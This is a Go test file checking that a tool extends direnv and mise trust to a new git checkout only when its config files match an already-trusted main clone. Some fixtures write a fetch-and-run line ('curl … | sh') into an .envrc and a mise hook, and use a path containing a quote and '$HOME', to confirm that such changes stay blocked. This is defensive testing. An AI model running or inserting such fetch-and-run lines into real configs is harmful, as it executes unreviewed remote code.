package gitx

import (
	"context"
	"os"
	"os/exec"
	"path/filepath"
	"slices"
	"strings"
	"testing"
)

// fakeDirenv puts a `direnv` on PATH that keeps an allow database the way
// the real one does -- keyed on the .envrc's directory AND its content, so
// an allowed file that changes is no longer allowed -- and answers `status`
// in the text format of the version named: "0"/"1" since 2.33 (2.37.1 on the
// laptop), "true"/"false" before (2.25.2 on dev, which ignores --json).
// Every call is logged to the returned file as "<cwd> <args>".
func fakeDirenv(t *testing.T, format string) (logPath string) {
	t.Helper()
	bin := t.TempDir()
	db := t.TempDir()
	logPath = filepath.Join(t.TempDir(), "direnv.log")
	yes, no := "0", "1"
	if format == "true" {
		yes, no = "true", "false"
	}
	script := `#!/bin/sh
printf '%s %s\n' "$PWD" "$*" >> '` + logPath + `'
key() { printf '%s' "$1" | tr / _; }
case "$1" in
status)
  [ -f .envrc ] || { echo "No .envrc or .env found"; exit 0; }
  echo "direnv exec path /usr/bin/direnv"
  echo "Found RC path $PWD/.envrc"
  if [ -f '` + db + `'/"$(key "$PWD")" ] && cmp -s '` + db + `'/"$(key "$PWD")" .envrc; then
    echo "Found RC allowed ` + yes + `"
  else
    echo "Found RC allowed ` + no + `"
  fi
  ;;
allow)
  d=${2:-$PWD}
  [ -f "$d/.envrc" ] || { echo "direnv: error .envrc file not found" >&2; exit 1; }
  cp "$d/.envrc" '` + db + `'/"$(key "$d")"
  ;;
esac
`
	if err := os.WriteFile(filepath.Join(bin, "direnv"), []byte(script), 0o755); err != nil {
		t.Fatal(err)
	}
	t.Setenv("PATH", bin+string(os.PathListSeparator)+os.Getenv("PATH"))
	// The script looks in $HOME/.local/bin as well (dev's mise is there),
	// so a test's home must not be the developer's.
	t.Setenv("HOME", t.TempDir())
	return logPath
}

// envrcOnly is ExtendTrust's answer about .envrc, for the cases that are
// about direnv alone.
func envrcOnly(tr EnvTrust, err error) (Envrc, error) { return tr.Envrc, err }

// direnvCalls is every logged call, "" when there were none.
func direnvCalls(t *testing.T, logPath string) string {
	t.Helper()
	b, err := os.ReadFile(logPath)
	if os.IsNotExist(err) {
		return ""
	}
	if err != nil {
		t.Fatal(err)
	}
	return string(b)
}

// allowIn is the operator's one explicit `direnv allow`, in dir.
func allowIn(t *testing.T, dir string) {
	t.Helper()
	cmd := exec.Command("direnv", "allow", dir)
	if out, err := cmd.CombinedOutput(); err != nil {
		t.Fatalf("direnv allow %s: %v\n%s", dir, err, out)
	}
}

func writeEnvrc(t *testing.T, dir, content string) {
	t.Helper()
	if err := os.WriteFile(filepath.Join(dir, ".envrc"), []byte(content), 0o644); err != nil {
		t.Fatal(err)
	}
}

// mainAndCheckout is a main clone and a new checkout beside it. The checkout
// is a plain directory: what AllowEnvrc reads of it is one file, and the
// main clone is the only side whose repository it asks about.
func mainAndCheckout(t *testing.T) (main, checkout string) {
	t.Helper()
	return mkRepo(t), t.TempDir()
}

const hubEnvrc = "PATH_add .venv/bin\nexport VIRTUAL_ENV=\"$(pwd)/.venv\"\n"

// TestAllowEnvrcAllowsAnIdenticalFileTheMainCloneHasAllowed is the rule's
// one positive case: the checkout's .envrc is byte-identical to the main
// clone's, which direnv already allows, so the checkout's is allowed too --
// in the checkout, by direnv itself.
func TestAllowEnvrcAllowsAnIdenticalFileTheMainCloneHasAllowed(t *testing.T) {
	for _, format := range []string{"0", "true"} {
		t.Run("allowed reads "+format, func(t *testing.T) {
			log := fakeDirenv(t, format)
			main, checkout := mainAndCheckout(t)
			writeEnvrc(t, main, hubEnvrc)
			writeEnvrc(t, checkout, hubEnvrc)
			allowIn(t, main)

			got, err := envrcOnly(Here.ExtendTrust(context.Background(), main, checkout))
			if err != nil {
				t.Fatalf("AllowEnvrc: %v\ndirenv calls:\n%s", err, direnvCalls(t, log))
			}
			if got != EnvrcAllowed {
				t.Fatalf("AllowEnvrc = %q, want %q\ndirenv calls:\n%s", got, EnvrcAllowed, direnvCalls(t, log))
			}
			if !strings.Contains(direnvCalls(t, log), "allow "+checkout+"\n") {
				t.Errorf("direnv was never asked to allow %s:\n%s", checkout, direnvCalls(t, log))
			}
		})
	}
}

// TestAllowEnvrcLeavesAFileTheMainCloneHasNotAllowed: identical content is
// not trust on its own. The anchor is the operator's own allow in the main
// clone, so without it nothing is allowed -- including a main clone whose
// allow went stale when its .envrc changed, which direnv reports the same.
func TestAllowEnvrcLeavesAFileTheMainCloneHasNotAllowed(t *testing.T) {
	cases := map[string]func(t *testing.T, main string){
		"never allowed": func(t *testing.T, main string) {},
		"allowed, then changed": func(t *testing.T, main string) {
			writeEnvrc(t, main, "export OLD=1\n")
			allowIn(t, main)
			writeEnvrc(t, main, hubEnvrc)
		},
	}
	for name, setup := range cases {
		t.Run(name, func(t *testing.T) {
			log := fakeDirenv(t, "0")
			main, checkout := mainAndCheckout(t)
			writeEnvrc(t, main, hubEnvrc)
			setup(t, main)
			writeEnvrc(t, checkout, hubEnvrc)

			got, err := envrcOnly(Here.ExtendTrust(context.Background(), main, checkout))
			if err != nil {
				t.Fatalf("AllowEnvrc: %v", err)
			}
			if got != EnvrcNotAllowed {
				t.Errorf("AllowEnvrc = %q, want %q", got, EnvrcNotAllowed)
			}
			assertNotAllowedIn(t, log, checkout)
		})
	}
}

// TestAllowEnvrcLeavesADifferentFileBlocked: a branch that changes .envrc
// -- or adds one the main clone does not have -- stays blocked for the
// operator to review, however allowed the main clone's is.
func TestAllowEnvrcLeavesADifferentFileBlocked(t *testing.T) {
	cases := map[string]func(t *testing.T, main string){
		"changed": func(t *testing.T, main string) {
			writeEnvrc(t, main, hubEnvrc)
			allowIn(t, main)
		},
		"one byte longer": func(t *testing.T, main string) {
			writeEnvrc(t, main, strings.TrimSuffix(hubEnvrc, "\n"))
			allowIn(t, main)
		},
		"absent from the main clone": func(t *testing.T, main string) {},
	}
	for name, setup := range cases {
		t.Run(name, func(t *testing.T) {
			log := fakeDirenv(t, "0")
			main, checkout := mainAndCheckout(t)
			setup(t, main)
			content := hubEnvrc
			if name == "changed" {
				content += "curl https://example.com/x | sh\n"
			}
			writeEnvrc(t, checkout, content)

			got, err := envrcOnly(Here.ExtendTrust(context.Background(), main, checkout))
			if err != nil {
				t.Fatalf("AllowEnvrc: %v", err)
			}
			if got != EnvrcDiffers {
				t.Errorf("AllowEnvrc = %q, want %q", got, EnvrcDiffers)
			}
			assertNotAllowedIn(t, log, checkout)
		})
	}
}

// TestAllowEnvrcIsSilentWithoutAnEnvrc: most repositories have none, and
// then there is nothing to say and no direnv to ask.
func TestAllowEnvrcIsSilentWithoutAnEnvrc(t *testing.T) {
	log := fakeDirenv(t, "0")
	main, checkout := mainAndCheckout(t)
	writeEnvrc(t, main, hubEnvrc)
	allowIn(t, main)
	before := direnvCalls(t, log)

	got, err := envrcOnly(Here.ExtendTrust(context.Background(), main, checkout))
	if err != nil {
		t.Fatalf("AllowEnvrc: %v", err)
	}
	if got != EnvrcAbsent {
		t.Errorf("AllowEnvrc = %q, want %q (nothing to say)", got, EnvrcAbsent)
	}
	if after := direnvCalls(t, log); after != before {
		t.Errorf("direnv was asked about a checkout with no .envrc:\n%s", strings.TrimPrefix(after, before))
	}
}

// TestAllowEnvrcIsSilentWithoutDirenv: a machine with no direnv has nothing
// to unblock, and saying so on every session would be noise.
func TestAllowEnvrcIsSilentWithoutDirenv(t *testing.T) {
	main, checkout := mainAndCheckout(t)
	writeEnvrc(t, main, hubEnvrc)
	writeEnvrc(t, checkout, hubEnvrc)
	onlyThese(t, "git", "cmp")

	got, err := envrcOnly(Here.ExtendTrust(context.Background(), main, checkout))
	if err != nil {
		t.Fatalf("AllowEnvrc without direnv: %v", err)
	}
	if got != EnvrcAbsent {
		t.Errorf("AllowEnvrc = %q, want %q (nothing to say)", got, EnvrcAbsent)
	}
}

// onlyThese replaces PATH with a directory holding just the named commands,
// so a test can take one away -- direnv is in /usr/bin beside git on most
// machines that have it.
func onlyThese(t *testing.T, names ...string) {
	t.Helper()
	bin := t.TempDir()
	for _, name := range names {
		p, err := exec.LookPath(name)
		if err != nil {
			t.Skipf("%s is not installed: %v", name, err)
		}
		if err := os.Symlink(p, filepath.Join(bin, name)); err != nil {
			t.Fatal(err)
		}
	}
	t.Setenv("PATH", bin)
}

// TestAllowEnvrcReadsTheMainClonesRoot: a project directory below the
// repository root is still that repository, and its .envrc is the root's.
func TestAllowEnvrcReadsTheMainClonesRoot(t *testing.T) {
	fakeDirenv(t, "0")
	main, checkout := mainAndCheckout(t)
	writeEnvrc(t, main, hubEnvrc)
	writeEnvrc(t, checkout, hubEnvrc)
	allowIn(t, main)
	sub := filepath.Join(main, "services", "api")
	if err := os.MkdirAll(sub, 0o755); err != nil {
		t.Fatal(err)
	}

	got, err := envrcOnly(Here.ExtendTrust(context.Background(), sub, checkout))
	if err != nil {
		t.Fatalf("AllowEnvrc: %v", err)
	}
	if got != EnvrcAllowed {
		t.Errorf("AllowEnvrc from %s = %q, want %q", sub, got, EnvrcAllowed)
	}
}

// TestAllowEnvrcQuotesBothPaths: either directory can carry a space, a
// quote or a dollar sign, and the script is re-parsed by a shell.
func TestAllowEnvrcQuotesBothPaths(t *testing.T) {
	fakeDirenv(t, "0")
	main := hostileRepo(t)
	checkout := filepath.Join(t.TempDir(), "it's $HOME too")
	if err := os.Mkdir(checkout, 0o755); err != nil {
		t.Fatal(err)
	}
	writeEnvrc(t, main, hubEnvrc)
	writeEnvrc(t, checkout, hubEnvrc)
	allowIn(t, main)

	got, err := envrcOnly(Here.ExtendTrust(context.Background(), main, checkout))
	if err != nil {
		t.Fatalf("AllowEnvrc: %v", err)
	}
	if got != EnvrcAllowed {
		t.Errorf("AllowEnvrc = %q, want %q", got, EnvrcAllowed)
	}
}

// TestAllowEnvrcReportsAnAllowThatDidNotTake: "allowed" is said only once
// direnv itself reports the checkout's file allowed, not because a command
// exited 0.
func TestAllowEnvrcReportsAnAllowThatDidNotTake(t *testing.T) {
	log := fakeDirenv(t, "0")
	main, checkout := mainAndCheckout(t)
	writeEnvrc(t, main, hubEnvrc)
	writeEnvrc(t, checkout, hubEnvrc)
	allowIn(t, main)
	// A direnv whose allow exits 0 and records nothing.
	bin := t.TempDir()
	real, err := exec.LookPath("direnv")
	if err != nil {
		t.Fatal(err)
	}
	script := "#!/bin/sh\n[ \"$1\" = allow ] && exit 0\nexec '" + real + "' \"$@\"\n"
	if err := os.WriteFile(filepath.Join(bin, "direnv"), []byte(script), 0o755); err != nil {
		t.Fatal(err)
	}
	t.Setenv("PATH", bin+string(os.PathListSeparator)+os.Getenv("PATH"))

	got, err := envrcOnly(Here.ExtendTrust(context.Background(), main, checkout))
	if err == nil {
		t.Fatalf("AllowEnvrc = %q, nil; want an error for an allow direnv does not report\n%s", got, direnvCalls(t, log))
	}
}

// TestAllowEnvrcRunsOnTheRemoteMachine is machine spec §8.2's rule applied
// here: on another machine the check and the allow both run there, in one
// ssh, and nothing runs on this machine.
func TestAllowEnvrcRunsOnTheRemoteMachine(t *testing.T) {
	log := fakeDirenv(t, "true")
	main, checkout := mainAndCheckout(t)
	writeEnvrc(t, main, hubEnvrc)
	writeEnvrc(t, checkout, hubEnvrc)
	allowIn(t, main)
	sshLog := fakeSSH(t, "")

	got, err := envrcOnly(Over("devbox").ExtendTrust(context.Background(), main, checkout))
	if err != nil {
		t.Fatalf("AllowEnvrc over ssh: %v", err)
	}
	if got != EnvrcAllowed {
		t.Fatalf("AllowEnvrc over ssh = %q, want %q", got, EnvrcAllowed)
	}
	argv := readArgv(t, sshLog)
	if !slices.Contains(argv, "devbox") {
		t.Errorf("ssh argv %q does not name the target", argv)
	}
	if n := strings.Count(readArgvRaw(t, sshLog), "\n--\n"); n != 1 {
		t.Errorf("ssh ran %d times, want 1: the race with the pane's first prompt has room for one round trip", n)
	}
	if !strings.Contains(direnvCalls(t, log), "allow "+checkout+"\n") {
		t.Errorf("direnv was never asked to allow %s:\n%s", checkout, direnvCalls(t, log))
	}
}

// TestAllowEnvrcReportsSSHFailing: an unreachable machine is an error, not
// a verdict -- the caller says the allow could not be done.
func TestAllowEnvrcReportsSSHFailing(t *testing.T) {
	fakeSSH(t, `echo "ssh: connect to host devbox: Connection refused" >&2; exit 255`)
	_, err := envrcOnly(Over("devbox").ExtendTrust(context.Background(), "/srv/hub", "/srv/wt"))
	if err == nil || !strings.Contains(err.Error(), "Connection refused") {
		t.Fatalf("err = %v, want ssh's own words", err)
	}
}

// TestAllowEnvrcWithTheRealDirenv runs the script against the installed
// direnv, when there is one, in a scratch data and config directory -- the
// stub above is this test's guess at direnv's output, and this is the check
// on the guess.
func TestAllowEnvrcWithTheRealDirenv(t *testing.T) {
	if _, err := exec.LookPath("direnv"); err != nil {
		t.Skip("direnv is not installed")
	}
	t.Setenv("HOME", t.TempDir())
	t.Setenv("XDG_DATA_HOME", t.TempDir())
	t.Setenv("XDG_CONFIG_HOME", t.TempDir())
	for _, v := range []string{"DIRENV_CONFIG", "DIRENV_DIR", "DIRENV_FILE", "DIRENV_DIFF", "DIRENV_WATCHES"} {
		t.Setenv(v, "")
		os.Unsetenv(v)
	}
	main, checkout := mainAndCheckout(t)
	writeEnvrc(t, main, hubEnvrc)
	writeEnvrc(t, checkout, hubEnvrc)

	if got, err := envrcOnly(Here.ExtendTrust(context.Background(), main, checkout)); err != nil || got != EnvrcNotAllowed {
		t.Fatalf("before the main clone's allow: AllowEnvrc = %q, %v; want %q", got, err, EnvrcNotAllowed)
	}
	allowIn(t, main)
	if got, err := envrcOnly(Here.ExtendTrust(context.Background(), main, checkout)); err != nil || got != EnvrcAllowed {
		t.Fatalf("after the main clone's allow: AllowEnvrc = %q, %v; want %q", got, err, EnvrcAllowed)
	}
}

func assertNotAllowedIn(t *testing.T, logPath, checkout string) {
	t.Helper()
	if calls := direnvCalls(t, logPath); strings.Contains(calls, "allow "+checkout) {
		t.Errorf("direnv was asked to allow %s:\n%s", checkout, calls)
	}
}

// fakeMise puts a `mise` in dir that keeps trust the way the real one does
// -- by DIRECTORY, not by content: `mise trust <path>` trusts the path's
// directory, and `mise trust --show` prints "<cwd>: trusted|untrusted" with
// $HOME spelled "~". Its `trust` exits $MISE_STUB_TRUST_EXIT when that is
// set and non-zero, and records nothing while exiting 0 when
// $MISE_STUB_TRUST_NOOP is set. With $MISE_STUB_SHOW_RESOLVED set, --show
// names the directory by its symlink-resolved path, as a mise that
// canonicalizes would. Calls are logged as "<cwd> <args>".
func fakeMise(t *testing.T, dir string) (logPath string) {
	t.Helper()
	db := t.TempDir()
	logPath = filepath.Join(t.TempDir(), "mise.log")
	script := `#!/bin/sh
printf '%s %s\n' "$PWD" "$*" >> '` + logPath + `'
key() { printf '%s' "$1" | tr / _; }
disp() { case $1 in "$HOME"/*) printf '~%s' "${1#"$HOME"}" ;; *) printf '%s' "$1" ;; esac; }
[ "$1" = trust ] || exit 0
if [ "$2" = --show ]; then
  shown=$PWD
  [ -z "$MISE_STUB_SHOW_RESOLVED" ] || shown=$(pwd -P)
  if [ -e '` + db + `'/"$(key "$PWD")" ]; then echo "$(disp "$shown"): trusted"; else echo "$(disp "$shown"): untrusted"; fi
  exit 0
fi
[ "${MISE_STUB_TRUST_EXIT:-0}" = 0 ] || { echo "mise ERROR could not trust" >&2; exit "$MISE_STUB_TRUST_EXIT"; }
[ -z "$MISE_STUB_TRUST_NOOP" ] || exit 0
d=${2:-$PWD}
[ -f "$d" ] && d=$(dirname "$d")
touch '` + db + `'/"$(key "$d")"
`
	if err := os.MkdirAll(dir, 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(dir, "mise"), []byte(script), 0o755); err != nil {
		t.Fatal(err)
	}
	return logPath
}

// miseOnPath is fakeMise on PATH.
func miseOnPath(t *testing.T) (logPath string) {
	t.Helper()
	bin := t.TempDir()
	logPath = fakeMise(t, bin)
	t.Setenv("PATH", bin+string(os.PathListSeparator)+os.Getenv("PATH"))
	return logPath
}

// trustIn is the operator's one explicit `mise trust`, of dir.
func trustIn(t *testing.T, dir string) {
	t.Helper()
	if out, err := exec.Command("mise", "trust", dir).CombinedOutput(); err != nil {
		t.Fatalf("mise trust %s: %v\n%s", dir, err, out)
	}
}

const hubMise = "[env]\n_.python.venv = { path = \".venv\" }\n"

func writeFile(t *testing.T, path, content string) {
	t.Helper()
	if err := os.MkdirAll(filepath.Dir(path), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(path, []byte(content), 0o644); err != nil {
		t.Fatal(err)
	}
}

// hubLike is a main clone and a new checkout that both carry hub's two
// files, with the operator's direnv allow already made in the main clone.
// Trusting mise there is each test's own business.
func hubLike(t *testing.T) (main, checkout string) {
	t.Helper()
	main, checkout = mainAndCheckout(t)
	for _, dir := range []string{main, checkout} {
		writeEnvrc(t, dir, hubEnvrc)
		writeFile(t, filepath.Join(dir, ".mise.toml"), hubMise)
	}
	allowIn(t, main)
	return main, checkout
}

// TestExtendTrustTrustsMiseAndAllowsTheEnvrc is the case the live check on
// dev needed: hub's .envrc runs `mise activate`, mise trusts by path, so a
// new checkout's identical .mise.toml is untrusted until it is trusted here
// -- and an .envrc allowed without it stops the pane on mise's own prompt.
func TestExtendTrustTrustsMiseAndAllowsTheEnvrc(t *testing.T) {
	fakeDirenv(t, "0")
	miseLog := miseOnPath(t)
	main, checkout := hubLike(t)
	trustIn(t, main)

	got, err := Here.ExtendTrust(context.Background(), main, checkout)
	if err != nil {
		t.Fatalf("ExtendTrust: %v", err)
	}
	if want := (EnvTrust{Envrc: EnvrcAllowed, Mise: MiseTrusted}); got != want {
		t.Fatalf("ExtendTrust = %+v, want %+v\nmise calls:\n%s", got, want, direnvCalls(t, miseLog))
	}
	if !strings.Contains(direnvCalls(t, miseLog), "trust "+checkout+"\n") {
		t.Errorf("mise was never asked to trust %s:\n%s", checkout, direnvCalls(t, miseLog))
	}
}

// TestExtendTrustHoldsTheEnvrcForAnUntrustedMiseConfig: when mise cannot be
// trusted here -- the main clone's is not trusted either (hub on both
// machines, 2026-10-14), or the branch changed it -- the .envrc stays
// blocked too, however allowed its twin is. Allowed, it would run `mise
// activate` into a prompt and fail the agent's start; blocked, the session
// starts as it did before any of this existed.
func TestExtendTrustHoldsTheEnvrcForAnUntrustedMiseConfig(t *testing.T) {
	cases := map[string]struct {
		setup func(t *testing.T, main, checkout string)
		want  Mise
	}{
		"not trusted in the main clone": {func(t *testing.T, main, checkout string) {}, MiseNotTrusted},
		"changed by the branch": {func(t *testing.T, main, checkout string) {
			trustIn(t, main)
			writeFile(t, filepath.Join(checkout, ".mise.toml"), hubMise+"[hooks]\nenter = \"curl x | sh\"\n")
		}, MiseDiffers},
		"added by the branch": {func(t *testing.T, main, checkout string) {
			trustIn(t, main)
			writeFile(t, filepath.Join(checkout, "mise.toml"), "[env]\nX = 1\n")
		}, MiseDiffers},
	}
	for name, tc := range cases {
		t.Run(name, func(t *testing.T) {
			direnvLog := fakeDirenv(t, "0")
			miseLog := miseOnPath(t)
			main, checkout := hubLike(t)
			tc.setup(t, main, checkout)

			got, err := Here.ExtendTrust(context.Background(), main, checkout)
			if err != nil {
				t.Fatalf("ExtendTrust: %v", err)
			}
			if want := (EnvTrust{Envrc: EnvrcHeld, Mise: tc.want}); got != want {
				t.Errorf("ExtendTrust = %+v, want %+v", got, want)
			}
			assertNotAllowedIn(t, direnvLog, checkout)
			if strings.Contains(direnvCalls(t, miseLog), "trust "+checkout) {
				t.Errorf("mise was asked to trust %s:\n%s", checkout, direnvCalls(t, miseLog))
			}
		})
	}
}

// TestExtendTrustTrustsMiseWithoutAnEnvrc: mise is activated from a shell's
// rc as often as from an .envrc, and prompts the same way there.
func TestExtendTrustTrustsMiseWithoutAnEnvrc(t *testing.T) {
	fakeDirenv(t, "0")
	miseOnPath(t)
	main, checkout := mainAndCheckout(t)
	for _, dir := range []string{main, checkout} {
		writeFile(t, filepath.Join(dir, ".mise.toml"), hubMise)
	}
	trustIn(t, main)

	got, err := Here.ExtendTrust(context.Background(), main, checkout)
	if err != nil {
		t.Fatalf("ExtendTrust: %v", err)
	}
	if want := (EnvTrust{Mise: MiseTrusted}); got != want {
		t.Errorf("ExtendTrust = %+v, want %+v", got, want)
	}
}

// TestExtendTrustIgnoresAMiseFileOnlyTheMainCloneHas: a mise.local.toml is
// usually untracked, so the main clone has one and a new checkout does not.
// Every file the checkout HAS must be the main clone's; one it lacks has
// nothing in it to trust.
func TestExtendTrustIgnoresAMiseFileOnlyTheMainCloneHas(t *testing.T) {
	fakeDirenv(t, "0")
	miseOnPath(t)
	main, checkout := hubLike(t)
	writeFile(t, filepath.Join(main, "mise.local.toml"), "[env]\nSECRET_SOURCE = \"op\"\n")
	trustIn(t, main)

	got, err := Here.ExtendTrust(context.Background(), main, checkout)
	if err != nil {
		t.Fatalf("ExtendTrust: %v", err)
	}
	if want := (EnvTrust{Envrc: EnvrcAllowed, Mise: MiseTrusted}); got != want {
		t.Errorf("ExtendTrust = %+v, want %+v", got, want)
	}
}

// TestExtendTrustFindsMiseInLocalBin is dev's shape: mise's installer puts
// it in ~/.local/bin, which a non-interactive ssh's PATH does not include.
// Not finding it there would read as "no mise", allow the .envrc, and
// reproduce the very prompt this exists to prevent.
func TestExtendTrustFindsMiseInLocalBin(t *testing.T) {
	fakeDirenv(t, "0")
	withoutOnPath(t, "mise")
	miseLog := fakeMise(t, filepath.Join(os.Getenv("HOME"), ".local", "bin"))
	main, checkout := hubLike(t)
	cmd := exec.Command(filepath.Join(os.Getenv("HOME"), ".local", "bin", "mise"), "trust", main)
	if out, err := cmd.CombinedOutput(); err != nil {
		t.Fatalf("mise trust: %v\n%s", err, out)
	}

	got, err := Here.ExtendTrust(context.Background(), main, checkout)
	if err != nil {
		t.Fatalf("ExtendTrust: %v", err)
	}
	if want := (EnvTrust{Envrc: EnvrcAllowed, Mise: MiseTrusted}); got != want {
		t.Errorf("ExtendTrust = %+v, want %+v\nmise calls:\n%s", got, want, direnvCalls(t, miseLog))
	}
}

// TestExtendTrustReportsATrustThatDidNotTake: a mise trust that fails is an
// error, and the .envrc is not allowed after it.
func TestExtendTrustReportsATrustThatDidNotTake(t *testing.T) {
	direnvLog := fakeDirenv(t, "0")
	miseOnPath(t)
	main, checkout := hubLike(t)
	trustIn(t, main)
	t.Setenv("MISE_STUB_TRUST_EXIT", "1")

	if got, err := Here.ExtendTrust(context.Background(), main, checkout); err == nil {
		t.Fatalf("ExtendTrust = %+v, nil; want mise's failure", got)
	}
	assertNotAllowedIn(t, direnvLog, checkout)
}

// TestExtendTrustReportsATrustThatExitedZeroAndDidNothing: "trusted" is
// said only once mise itself reports the checkout trusted, not because a
// command exited 0 -- the same rule as direnv's half.
func TestExtendTrustReportsATrustThatExitedZeroAndDidNothing(t *testing.T) {
	direnvLog := fakeDirenv(t, "0")
	miseOnPath(t)
	main, checkout := hubLike(t)
	trustIn(t, main)
	t.Setenv("MISE_STUB_TRUST_NOOP", "1")

	if got, err := Here.ExtendTrust(context.Background(), main, checkout); err == nil {
		t.Fatalf("ExtendTrust = %+v, nil; want an error for a trust mise does not report", got)
	}
	assertNotAllowedIn(t, direnvLog, checkout)
}

// TestExtendTrustRunsMiseOnTheRemoteMachine: mise's half runs in the same
// one ssh as direnv's, on that machine.
func TestExtendTrustRunsMiseOnTheRemoteMachine(t *testing.T) {
	fakeDirenv(t, "true")
	miseLog := miseOnPath(t)
	main, checkout := hubLike(t)
	trustIn(t, main)
	sshLog := fakeSSH(t, "")

	got, err := Over("devbox").ExtendTrust(context.Background(), main, checkout)
	if err != nil {
		t.Fatalf("ExtendTrust over ssh: %v", err)
	}
	if want := (EnvTrust{Envrc: EnvrcAllowed, Mise: MiseTrusted}); got != want {
		t.Fatalf("ExtendTrust over ssh = %+v, want %+v", got, want)
	}
	if n := strings.Count(readArgvRaw(t, sshLog), "\n--\n"); n != 1 {
		t.Errorf("ssh ran %d times, want 1", n)
	}
	if !strings.Contains(direnvCalls(t, miseLog), "trust "+checkout+"\n") {
		t.Errorf("mise was never asked to trust %s:\n%s", checkout, direnvCalls(t, miseLog))
	}
}

// TestExtendTrustWithTheRealMise checks fakeMise's guess at mise against the
// installed one, when there is one, in a scratch state directory: trust by
// directory, and `--show`'s "<dir>: trusted" with home spelled "~".
func TestExtendTrustWithTheRealMise(t *testing.T) {
	realMise, err := exec.LookPath("mise")
	if err != nil {
		t.Skip("mise is not installed")
	}
	fakeDirenv(t, "0")
	home := os.Getenv("HOME") // fakeDirenv's scratch home
	for k, v := range map[string]string{
		"MISE_STATE_DIR": filepath.Join(home, "state"), "MISE_DATA_DIR": filepath.Join(home, "data"),
		"MISE_CACHE_DIR": filepath.Join(home, "cache"), "MISE_CONFIG_DIR": filepath.Join(home, "config"),
		"XDG_CONFIG_HOME": filepath.Join(home, "xdg"), "MISE_TRUSTED_CONFIG_PATHS": "",
		"MISE_HIDE_UPDATE_WARNING": "1", "MISE_PARANOID": "", "CI": "",
	} {
		t.Setenv(k, v)
	}
	os.Unsetenv("MISE_TRUSTED_CONFIG_PATHS")
	os.Unsetenv("CI") // mise assumes trust in detected CI
	bin := t.TempDir()
	if err := os.Symlink(realMise, filepath.Join(bin, "mise")); err != nil {
		t.Fatal(err)
	}
	t.Setenv("PATH", bin+string(os.PathListSeparator)+os.Getenv("PATH"))
	// Under the scratch home, so --show spells it with "~" as on the machines.
	main := filepath.Join(home, "quantivly", "hub")
	if err := os.MkdirAll(filepath.Dir(main), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.Rename(mkRepo(t), main); err != nil {
		t.Fatal(err)
	}
	checkout := filepath.Join(home, ".herdr", "worktrees", "hub", "zvi-x")
	if err := os.MkdirAll(checkout, 0o755); err != nil {
		t.Fatal(err)
	}
	for _, dir := range []string{main, checkout} {
		writeEnvrc(t, dir, hubEnvrc)
		writeFile(t, filepath.Join(dir, ".mise.toml"), hubMise)
	}
	allowIn(t, main)

	if got, err := Here.ExtendTrust(context.Background(), main, checkout); err != nil || got != (EnvTrust{Envrc: EnvrcHeld, Mise: MiseNotTrusted}) {
		t.Fatalf("before the main clone's trust: ExtendTrust = %+v, %v", got, err)
	}
	trustIn(t, main)
	if got, err := Here.ExtendTrust(context.Background(), main, checkout); err != nil || got != (EnvTrust{Envrc: EnvrcAllowed, Mise: MiseTrusted}) {
		t.Fatalf("after the main clone's trust: ExtendTrust = %+v, %v", got, err)
	}
}

// withoutOnPath drops from PATH every directory holding name, so a test can
// put its own somewhere PATH does not reach.
func withoutOnPath(t *testing.T, name string) {
	t.Helper()
	var keep []string
	for _, dir := range filepath.SplitList(os.Getenv("PATH")) {
		if _, err := os.Stat(filepath.Join(dir, name)); err != nil {
			keep = append(keep, dir)
		}
	}
	t.Setenv("PATH", strings.Join(keep, string(os.PathListSeparator)))
}

// TestExtendTrustKeepsTheMainClonesPathAsSpelled: direnv keys an allow on the
// path the operator's shell spelled, and mise a trust on the directory as it
// was named, so a main clone reached through a symlink -- macOS's /var, or a
// home whose ~/quantivly links elsewhere -- must be asked about by that same
// spelling. git's --show-toplevel resolves symlinks, and asking direnv about
// the resolved path read every such clone as not allowed (macOS CI, #366).
func TestExtendTrustKeepsTheMainClonesPathAsSpelled(t *testing.T) {
	fakeDirenv(t, "0")
	miseOnPath(t)
	real, checkout := hubLike(t)
	link := filepath.Join(t.TempDir(), "hub-link")
	if err := os.Symlink(real, link); err != nil {
		t.Fatal(err)
	}
	allowIn(t, link)
	trustIn(t, link)
	sub := filepath.Join(link, "services")
	if err := os.MkdirAll(sub, 0o755); err != nil {
		t.Fatal(err)
	}

	for _, resolved := range []string{"", "1"} {
		t.Setenv("MISE_STUB_SHOW_RESOLVED", resolved)
		for _, source := range []string{link, sub} {
			got, err := Here.ExtendTrust(context.Background(), source, checkout)
			if err != nil {
				t.Fatalf("ExtendTrust(%s): %v", source, err)
			}
			if want := (EnvTrust{Envrc: EnvrcAllowed, Mise: MiseTrusted}); got != want {
				t.Errorf("mise naming the resolved path: %q; ExtendTrust(%s) = %+v, want %+v", resolved, source, got, want)
			}
		}
	}
}
